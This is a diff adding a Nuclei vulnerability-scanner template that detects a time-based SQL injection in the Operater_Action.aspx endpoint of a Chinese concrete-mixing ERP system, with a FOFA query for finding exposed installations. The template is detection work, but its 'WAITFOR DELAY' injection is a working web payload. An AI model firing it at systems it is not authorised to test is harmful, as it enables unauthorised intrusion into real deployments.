@@ -1,0 +1,56 @@
+id: shanghun-erp-operater-action-sqli
+info:
+  name: 商混ERP系统 Operater_Action接口存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 商混ERP
+    fofa: app="商混ERP系统"
+variables:
+  t1: "{{rand_int(3,5)}}"
+  t2: "{{to_number(t1)*2}}"
+  t3: "{{to_number(t2)+2}}"
+  t4: "{{rand_int(1,3)}}"
+  t5: "{{to_number(t4)*2}}"
+  t6: "{{to_number(t5)+2}}"
+http:
+  - raw:
+      - |
+        GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "无标题页"
+          - "window.location.href='Schedule.aspx?"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2)"
+          - "duration <= to_number(t3)"
+
+  - raw:
+      - |
+        GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:{{t4}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "无标题页"
+          - "window.location.href='Schedule.aspx?"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t5)"
+          - "duration <= to_number(t6)"
